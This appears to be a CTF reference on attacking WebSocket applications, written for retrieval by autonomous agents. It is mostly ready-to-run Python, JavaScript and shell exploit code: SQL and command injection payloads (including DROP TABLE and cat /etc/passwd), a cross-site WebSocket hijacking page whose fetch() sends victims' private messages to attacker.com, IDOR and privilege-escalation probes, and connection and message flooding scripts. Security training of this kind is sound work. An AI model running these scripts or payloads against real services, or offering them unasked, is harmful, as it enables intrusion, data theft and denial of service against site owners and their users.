# WebSocket Vulnerabilities - CTF Exploitation Reference

> **Document Purpose:** Actionable WebSocket attack techniques for CTF challenges. Designed for autonomous agent retrieval with exploitation scripts, common vulnerabilities, and testing methods.

---

## 1. QUICK REFERENCE: WebSocket Basics

> **When to use this section:** You encounter WebSocket connections in web applications.

### 1.1 What are WebSockets?

**Tags:** `websocket, ws, realtime, bidirectional`

**Concept:**
WebSockets provide full-duplex, bidirectional communication over a single TCP connection. Unlike HTTP, both client and server can send messages at any time.

**WebSocket vs HTTP:**
| Feature | HTTP | WebSocket |
|---------|------|-----------|
| Connection | Request-response | Persistent |
| Direction | Client initiates | Bidirectional |
| Protocol | http:// / https:// | ws:// / wss:// |
| Overhead | Headers per request | Minimal frames |
| Use case | Static content | Real-time apps |

**WebSocket URL Formats:**
```
ws://example.com/socket
wss://example.com/socket  (TLS encrypted)
ws://example.com:8080/ws
```

**Agent Takeaway:**
- WebSockets use ws:// or wss:// protocol
- Connection stays open after handshake
- Both sides can send messages anytime

---

### 1.2 WebSocket Handshake

**Tags:** `websocket, handshake, upgrade, connection`

**HTTP Upgrade Request:**
```http
GET /socket HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: http://example.com
```

**Server Response:**
```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

**Key Headers:**
```
Sec-WebSocket-Key: Random base64 from client
Sec-WebSocket-Accept: Server confirmation (derived from key)
Sec-WebSocket-Protocol: Subprotocol negotiation
Origin: Origin header for CORS-like checks
```

**Agent Takeaway:**
- Handshake is HTTP upgrade request
- Look for 101 Switching Protocols response
- Origin header is important for security

---

### 1.3 Detecting WebSocket Endpoints

**Tags:** `websocket, detection, recon, discovery`

**JavaScript Detection:**
```javascript
// In browser console, look for:
new WebSocket(...)
socket = new WebSocket(...)
ws = new WebSocket(...)
```

**Common Endpoints:**
```
/ws
/socket
/websocket
/socket.io/?EIO=4&transport=websocket
/sockjs/...
/cable (ActionCable)
/hub (SignalR)
```

**Network Tab Detection:**
```
1. Open DevTools -> Network tab
2. Filter by "WS" type
3. Look for 101 status code
4. Click to see messages
```

**Grep in JavaScript Files:**
```bash
grep -r "WebSocket\|socket\.io\|sockjs" *.js
grep -r "wss://\|ws://" *.js
```

**Agent Takeaway:**
- Check Network tab for WS connections
- Search JS files for WebSocket URLs
- Common paths: /ws, /socket, /websocket

---

## 2. WEBSOCKET INTERCEPTION AND MANIPULATION

> **When to use this section:** Intercepting and modifying WebSocket traffic.

### 2.1 Burp Suite WebSocket Interception

**Tags:** `websocket, burp, intercept, proxy`

**Setup:**
```
1. Proxy -> WebSockets history
2. Shows all WebSocket messages
3. Right-click -> Send to Repeater
```

**Repeater for WebSockets:**
```
1. Send WebSocket request to Repeater
2. Modify handshake or messages
3. Test different payloads
```

**Intercepting Messages:**
```
1. Proxy -> Intercept -> Intercept WebSocket messages
2. Modify messages in real-time
3. Forward or drop as needed
```

**Agent Takeaway:**
- Burp captures WebSocket messages
- Use Repeater to replay/modify
- Can intercept in real-time

---

### 2.2 Python WebSocket Client

**Tags:** `websocket, python, client, testing`

**Basic WebSocket Client:**
```python
import asyncio
import websockets

async def test_websocket(url):
    async with websockets.connect(url) as ws:
        # Send a message
        await ws.send('{"action": "ping"}')

        # Receive response
        response = await ws.recv()
        print(f"Received: {response}")

asyncio.run(test_websocket("ws://target.com/socket"))
```

**Interactive Client:**
```python
import asyncio
import websockets

async def interactive_client(url):
    async with websockets.connect(url) as ws:
        # Receive messages in background
        async def receiver():
            async for message in ws:
                print(f"< {message}")

        recv_task = asyncio.create_task(receiver())

        # Send messages from input
        while True:
            message = input("> ")
            if message == "exit":
                break
            await ws.send(message)

asyncio.run(interactive_client("ws://target.com/socket"))
```

**With Custom Headers:**
```python
import asyncio
import websockets

async def connect_with_headers(url):
    headers = {
        "Cookie": "session=your_session_token",
        "Origin": "http://target.com",
        "Authorization": "Bearer token123"
    }

    async with websockets.connect(url, extra_headers=headers) as ws:
        await ws.send('{"action": "test"}')
        response = await ws.recv()
        print(response)

asyncio.run(connect_with_headers("ws://target.com/socket"))
```

**Agent Takeaway:**
- Use websockets library for Python
- Can send/receive arbitrary messages
- Add custom headers for authentication

---

### 2.3 Browser-Based Testing

**Tags:** `websocket, browser, console, devtools`

**JavaScript Console Testing:**
```javascript
// Connect to WebSocket
let ws = new WebSocket("ws://target.com/socket");

// On open
ws.onopen = () => {
    console.log("Connected");
    ws.send('{"action": "test"}');
};

// On message
ws.onmessage = (event) => {
    console.log("Received:", event.data);
};

// On error
ws.onerror = (error) => {
    console.log("Error:", error);
};

// Send custom message
ws.send('{"action": "malicious", "data": "payload"}');
```

**Hijack Existing Connection:**
```javascript
// If socket is stored in global variable
socket.send('{"action": "admin", "command": "getUsers"}');

// Or find it in page scope
// Check for: window.socket, app.socket, ws, socket
```

**Agent Takeaway:**
- Use browser console for quick testing
- Existing connections may be exploitable
- Check for global socket variables

---

## 3. WEBSOCKET INJECTION ATTACKS

> **When to use this section:** Injecting malicious payloads via WebSocket.

### 3.1 SQL Injection via WebSocket

**Tags:** `websocket, sqli, injection, database`

**Vulnerable Message:**
```json
{"action": "search", "query": "admin"}
```

**SQLi Payloads:**
```json
{"action": "search", "query": "admin' OR '1'='1"}
{"action": "search", "query": "admin' UNION SELECT username,password FROM users--"}
{"action": "getUser", "id": "1 OR 1=1"}
```

**Python Exploit:**
```python
import asyncio
import websockets
import json

async def sqli_test(url, payloads):
    async with websockets.connect(url) as ws:
        for payload in payloads:
            message = json.dumps({"action": "search", "query": payload})
            await ws.send(message)
            response = await ws.recv()
            print(f"Payload: {payload}")
            print(f"Response: {response}\n")

payloads = [
    "test",
    "' OR '1'='1",
    "' UNION SELECT NULL--",
    "' AND 1=1--",
]

asyncio.run(sqli_test("ws://target.com/socket", payloads))
```

**Agent Takeaway:**
- Same SQLi techniques apply to WebSocket
- Test all message fields
- Backend may not sanitize WebSocket input

---

### 3.2 Command Injection via WebSocket

**Tags:** `websocket, command-injection, rce, os`

**Vulnerable Patterns:**
```json
{"action": "ping", "host": "google.com"}
{"action": "exec", "command": "whoami"}
{"action": "convert", "filename": "image.png"}
```

**Injection Payloads:**
```json
{"action": "ping", "host": "google.com; id"}
{"action": "ping", "host": "$(whoami)"}
{"action": "ping", "host": "`id`"}
{"action": "convert", "filename": "image.png; cat /etc/passwd"}
```

**Testing Script:**
```python
import asyncio
import websockets
import json

async def command_injection_test(url):
    payloads = [
        {"action": "ping", "host": "127.0.0.1; id"},
        {"action": "ping", "host": "127.0.0.1 && id"},
        {"action": "ping", "host": "127.0.0.1 | id"},
        {"action": "ping", "host": "$(id)"},
    ]

    async with websockets.connect(url) as ws:
        for payload in payloads:
            await ws.send(json.dumps(payload))
            response = await ws.recv()
            if "uid=" in response:
                print(f"[+] Vulnerable! Payload: {payload}")
            print(f"Response: {response[:200]}")

asyncio.run(command_injection_test("ws://target.com/socket"))
```

**Agent Takeaway:**
- Look for actions that might execute commands
- ping, exec, convert, process are common targets
- Same payloads as HTTP command injection

---

### 3.3 Cross-Site WebSocket Hijacking (CSWSH)

**Tags:** `websocket, cswsh, csrf, hijacking`

**The Vulnerability:**
WebSocket handshake doesn't have CSRF protection, allowing attacker sites to connect to victim's WebSocket.

**Attack Scenario:**
```
1. Victim is logged into target.com
2. Victim visits attacker.com
3. Attacker's page opens WebSocket to target.com
4. Connection uses victim's cookies
5. Attacker can send/receive messages as victim
```

**Attacker's Malicious Page:**
```html
<!DOCTYPE html>
<html>
<head><title>CSWSH Attack</title></head>
<body>
<script>
// Connect to victim's WebSocket server
let ws = new WebSocket("wss://target.com/socket");

ws.onopen = function() {
    console.log("Connected as victim!");
    // Exfiltrate data
    ws.send('{"action": "getPrivateMessages"}');
};

ws.onmessage = function(event) {
    // Send data to attacker's server
    fetch("https://attacker.com/log?data=" + encodeURIComponent(event.data));
    console.log("Received:", event.data);
};
</script>
<h1>Loading...</h1>
</body>
</html>
```

**Detection:**
```
1. Check if Origin header is validated
2. Check if WebSocket requires authentication beyond cookies
3. Test by connecting from different origin
```

**Agent Takeaway:**
- WebSocket may inherit HTTP cookies
- Origin header often not validated
- Can hijack authenticated sessions

---

## 4. WEBSOCKET AUTHORIZATION ISSUES

> **When to use this section:** Bypassing WebSocket access controls.

### 4.1 Missing Authentication

**Tags:** `websocket, authentication, bypass, access`

**The Vulnerability:**
WebSocket may accept connections without proper authentication.

**Testing:**
```python
import asyncio
import websockets

async def test_no_auth(url):
    try:
        # Connect without any authentication
        async with websockets.connect(url) as ws:
            # Try admin actions
            await ws.send('{"action": "listUsers"}')
            response = await ws.recv()
            print(f"[+] No auth required: {response}")
    except Exception as e:
        print(f"[-] Auth required: {e}")

asyncio.run(test_no_auth("ws://target.com/admin/socket"))
```

**Common Issues:**
```
- WebSocket endpoint has no auth check
- Auth only on handshake, not messages
- Different auth than HTTP API
```

**Agent Takeaway:**
- Try connecting without credentials
- WebSocket may have separate auth from HTTP
- Test admin/privileged endpoints

---

### 4.2 Insufficient Message Authorization

**Tags:** `websocket, authorization, message, idor`

**The Vulnerability:**
After connection, individual messages may not be authorized.

**Testing Different Actions:**
```python
import asyncio
import websockets
import json

async def test_message_auth(url, session_cookie):
    headers = {"Cookie": f"session={session_cookie}"}

    async with websockets.connect(url, extra_headers=headers) as ws:
        # Test accessing other users' data
        messages = [
            {"action": "getUser", "userId": 1},
            {"action": "getUser", "userId": 2},
            {"action": "getMessage", "messageId": 999},
            {"action": "admin", "command": "listUsers"},
            {"action": "deleteUser", "userId": 1},
        ]

        for msg in messages:
            await ws.send(json.dumps(msg))
            response = await ws.recv()
            print(f"Action: {msg}")
            print(f"Response: {response}\n")

asyncio.run(test_message_auth("ws://target.com/socket", "your_session"))
```

**Agent Takeaway:**
- Test actions meant for other users
- Try admin actions as regular user
- Each message type may have different auth

---

### 4.3 Token/Session Manipulation

**Tags:** `websocket, session, token, manipulation`

**In-Message Token:**
```json
{"token": "eyJ...", "action": "getData"}
```

**Attack:**
```python
import asyncio
import websockets
import json

async def token_manipulation(url):
    async with websockets.connect(url) as ws:
        # Try no token
        await ws.send(json.dumps({"action": "getData"}))
        print(await ws.recv())

        # Try empty token
        await ws.send(json.dumps({"token": "", "action": "getData"}))
        print(await ws.recv())

        # Try null token
        await ws.send(json.dumps({"token": None, "action": "getData"}))
        print(await ws.recv())

        # Try admin token guessing
        await ws.send(json.dumps({"token": "admin", "action": "getData"}))
        print(await ws.recv())

asyncio.run(token_manipulation("ws://target.com/socket"))
```

**Agent Takeaway:**
- Tokens may be in WebSocket messages
- Try removing, emptying, or modifying tokens
- May have different validation than HTTP

---

## 5. WEBSOCKET MESSAGE MANIPULATION

> **When to use this section:** Modifying WebSocket message content.

### 5.1 Message Structure Manipulation

**Tags:** `websocket, message, structure, manipulation`

**Adding Extra Fields:**
```json
// Original
{"action": "updateProfile", "name": "user"}

// Attack - add admin field
{"action": "updateProfile", "name": "user", "isAdmin": true}
{"action": "updateProfile", "name": "user", "role": "admin"}
```

**Changing Action Types:**
```json
// Original action
{"type": "read", "id": 1}

// Try other actions
{"type": "write", "id": 1, "data": "modified"}
{"type": "delete", "id": 1}
{"type": "admin", "id": 1}
```

**Testing Script:**
```python
import asyncio
import websockets
import json

async def manipulate_messages(url, original_message):
    manipulations = [
        {**original_message, "isAdmin": True},
        {**original_message, "role": "admin"},
        {**original_message, "debug": True},
        {**original_message, "userId": 1},  # IDOR
    ]

    async with websockets.connect(url) as ws:
        for msg in manipulations:
            await ws.send(json.dumps(msg))
            response = await ws.recv()
            print(f"Sent: {msg}")
            print(f"Received: {response}\n")

asyncio.run(manipulate_messages(
    "ws://target.com/socket",
    {"action": "getProfile"}
))
```

**Agent Takeaway:**
- Add extra fields to messages
- Change action/type values
- Server may not validate all fields

---

### 5.2 Binary Message Manipulation

**Tags:** `websocket, binary, manipulation, protocol`

**Detecting Binary Protocol:**
```python
import asyncio
import websockets

async def detect_protocol(url):
    async with websockets.connect(url) as ws:
        # Receive and check type
        message = await ws.recv()

        if isinstance(message, bytes):
            print("Binary protocol detected")
            print(f"Hex: {message.hex()}")
        else:
            print("Text protocol")
            print(f"Content: {message}")

asyncio.run(detect_protocol("ws://target.com/socket"))
```

**Binary Manipulation:**
```python
import asyncio
import websockets
import struct

async def binary_manipulation(url):
    async with websockets.connect(url) as ws:
        # Example: modify user ID in binary message
        # Original: \x01\x00\x00\x00\x01 (action=1, userId=1)
        # Attack:   \x01\x00\x00\x00\x02 (action=1, userId=2)

        original = b'\x01\x00\x00\x00\x01'
        modified = b'\x01\x00\x00\x00\x02'

        await ws.send(modified)
        response = await ws.recv()
        print(f"Response: {response}")

asyncio.run(binary_manipulation("ws://target.com/socket"))
```

**Agent Takeaway:**
- Some WebSockets use binary protocols
- May need to reverse-engineer format
- Modify bytes directly for exploitation

---

## 6. WEBSOCKET DENIAL OF SERVICE

> **When to use this section:** Testing WebSocket DoS vulnerabilities.

### 6.1 Connection Exhaustion

**Tags:** `websocket, dos, connections, exhaustion`

**Many Connections:**
```python
import asyncio
import websockets

async def connection_flood(url, count=1000):
    connections = []

    async def open_connection():
        try:
            ws = await websockets.connect(url)
            connections.append(ws)
            return ws
        except Exception as e:
            print(f"Failed: {e}")
            return None

    # Open many connections
    tasks = [open_connection() for _ in range(count)]
    await asyncio.gather(*tasks)

    print(f"Opened {len([c for c in connections if c])} connections")

    # Keep connections alive
    await asyncio.sleep(60)

asyncio.run(connection_flood("ws://target.com/socket", 500))
```

**Agent Takeaway:**
- WebSocket connections consume server resources
- May exhaust connection pool
- Test for connection limits

---

### 6.2 Message Flooding

**Tags:** `websocket, dos, flooding, messages`

**Flood with Messages:**
```python
import asyncio
import websockets

async def message_flood(url, count=10000):
    async with websockets.connect(url) as ws:
        for i in range(count):
            await ws.send(f'{{"action": "ping", "id": {i}}}')

        print(f"Sent {count} messages")

asyncio.run(message_flood("ws://target.com/socket", 10000))
```

**Large Message:**
```python
import asyncio
import websockets

async def large_message(url, size_mb=10):
    async with websockets.connect(url) as ws:
        # Create large payload
        payload = "A" * (size_mb * 1024 * 1024)
        await ws.send(payload)
        print(f"Sent {size_mb}MB message")

asyncio.run(large_message("ws://target.com/socket", 100))
```

**Agent Takeaway:**
- Test message rate limiting
- Test maximum message size
- May crash server or cause memory issues

---

## 7. CTF-SPECIFIC STRATEGIES

> **When to use this section:** Solving WebSocket challenges in CTF.

### 7.1 WebSocket CTF Playbook

**Tags:** `websocket, ctf, playbook, workflow`

**Step 1: Identify WebSocket Endpoint**
```
1. Check Network tab for WS connections
2. Search JavaScript for WebSocket URLs
3. Look for /ws, /socket, /websocket paths
```

**Step 2: Analyze Protocol**
```
1. Connect and observe messages
2. Identify message format (JSON, binary)
3. Note authentication mechanism
4. List available actions/commands
```

**Step 3: Test Authorization**
```
1. Connect without credentials
2. Try privileged actions
3. Access other users' data
4. Manipulate tokens/sessions
```

**Step 4: Test for Injection**
```
1. SQLi in message fields
2. Command injection in actions
3. XSS if messages displayed
```

**Step 5: Exploit**
```
1. Exfiltrate sensitive data
2. Execute privileged operations
3. Achieve command execution
```

**Agent Takeaway:**
- Find endpoint first
- Understand message format
- Test auth and injection

---

### 7.2 WebSocket Decision Tree

**Tags:** `websocket, decision-tree, workflow`

```
START: WebSocket endpoint found

STEP 1: Connect and observe
├── Note message format (JSON/binary)
├── List all message types
├── Identify auth mechanism
└── Check for Origin validation

STEP 2: Test authentication
├── Connect without credentials
├── Connect with invalid credentials
├── Try expired/other user's tokens
└── Test CSWSH from different origin

STEP 3: Test authorization
├── Try admin actions
├── Access other users' data (IDOR)
├── Modify protected fields
└── Add extra fields to messages

STEP 4: Test for injection
├── SQLi in string fields
├── Command injection in actions
├── NoSQL operators in JSON
└── XSS if messages displayed

STEP 5: Escalate
├── Exfiltrate flag/secrets
├── RCE via command injection
├── Privilege escalation
└── Data manipulation
```

---

## 8. TOOLS AND AUTOMATION

> **When to use this section:** Tools for WebSocket testing.

### 8.1 WebSocket Testing Tools

**Tags:** `websocket, tools, testing, automation`

**websocat (CLI):**
```bash
# Connect and interact
websocat ws://target.com/socket

# Send message
echo '{"action":"test"}' | websocat ws://target.com/socket

# With headers
websocat -H "Cookie: session=abc" ws://target.com/socket
```

**wscat (Node.js):**
```bash
# Install
npm install -g wscat

# Connect
wscat -c ws://target.com/socket

# With headers
wscat -c ws://target.com/socket -H "Cookie: session=abc"
```

**Browser Extension - Simple WebSocket Client:**
```
Chrome/Firefox extension for manual testing
- Connect to any WebSocket
- Send/receive messages
- View message history
```

**Agent Takeaway:**
- websocat for CLI testing
- wscat as alternative
- Browser extensions for quick tests

---

### 8.2 Complete Python Testing Framework

**Tags:** `websocket, python, framework, testing`

**WebSocket Tester Class:**
```python
import asyncio
import websockets
import json
from typing import List, Dict, Any, Optional

class WebSocketTester:
    def __init__(self, url: str, headers: Optional[Dict[str, str]] = None):
        self.url = url
        self.headers = headers or {}
        self.messages_received = []

    async def connect(self):
        """Establish WebSocket connection."""
        self.ws = await websockets.connect(
            self.url,
            extra_headers=self.headers
        )
        return self

    async def send(self, message: Any) -> str:
        """Send message and get response."""
        if isinstance(message, dict):
            message = json.dumps(message)
        await self.ws.send(message)
        response = await self.ws.recv()
        self.messages_received.append(response)
        return response

    async def send_batch(self, messages: List[Any]) -> List[str]:
        """Send multiple messages."""
        responses = []
        for msg in messages:
            response = await self.send(msg)
            responses.append(response)
        return responses

    async def listen(self, duration: float = 5.0):
        """Listen for messages for specified duration."""
        async def receiver():
            try:
                async for message in self.ws:
                    self.messages_received.append(message)
                    print(f"Received: {message}")
            except:
                pass

        await asyncio.wait_for(receiver(), timeout=duration)

    async def close(self):
        """Close connection."""
        await self.ws.close()

    async def test_injection(self, field: str, payloads: List[str]):
        """Test field for injection vulnerabilities."""
        results = []
        for payload in payloads:
            message = {field: payload}
            response = await self.send(message)
            results.append({
                "payload": payload,
                "response": response
            })
        return results

    async def test_idor(self, action: str, id_field: str, id_range: range):
        """Test for IDOR vulnerability."""
        results = []
        for i in id_range:
            message = {"action": action, id_field: i}
            response = await self.send(message)
            if "error" not in response.lower():
                results.append({"id": i, "response": response})
        return results


async def main():
    # Example usage
    tester = WebSocketTester(
        "ws://target.com/socket",
        headers={"Cookie": "session=abc123"}
    )

    await tester.connect()

    # Test basic functionality
    response = await tester.send({"action": "ping"})
    print(f"Ping response: {response}")

    # Test IDOR
    idor_results = await tester.test_idor("getUser", "userId", range(1, 10))
    print(f"IDOR results: {idor_results}")

    # Test SQLi
    sqli_payloads = ["'", "' OR '1'='1", "1; DROP TABLE users--"]
    sqli_results = await tester.test_injection("query", sqli_payloads)
    print(f"SQLi results: {sqli_results}")

    await tester.close()

asyncio.run(main())
```

**Agent Takeaway:**
- Reusable testing framework
- Automates common attacks
- Easy to extend for specific needs

---

## 9. SUMMARY: WebSocket Quick Reference

**Find WebSocket:**
```
Network tab -> Filter WS
Search JS: "WebSocket", "ws://", "wss://"
Common paths: /ws, /socket, /websocket
```

**Connect with Python:**
```python
import asyncio
import websockets

async def test(url):
    async with websockets.connect(url) as ws:
        await ws.send('{"action":"test"}')
        print(await ws.recv())

asyncio.run(test("ws://target.com/socket"))
```

**Connect with CLI:**
```bash
websocat ws://target.com/socket
wscat -c ws://target.com/socket
```

**Browser Console:**
```javascript
let ws = new WebSocket("ws://target.com/socket");
ws.onmessage = (e) => console.log(e.data);
ws.send('{"action":"test"}');
```

**Key Attacks:**
```
1. Missing auth - connect without credentials
2. IDOR - access other users' data
3. SQLi/CMDi - inject in message fields
4. CSWSH - hijack from malicious page
5. Message manipulation - add/modify fields
```

**Common Payloads:**
```json
{"action": "admin", "command": "getFlag"}
{"userId": 1}  // IDOR
{"query": "' OR '1'='1"}  // SQLi
{"host": "127.0.0.1; id"}  // CMDi
{"isAdmin": true}  // Privilege escalation
```

**Tools:**
```
Burp Suite - WebSocket history/repeater
websocat - CLI WebSocket client
wscat - Node.js WebSocket client
Python websockets - Scripted testing
```
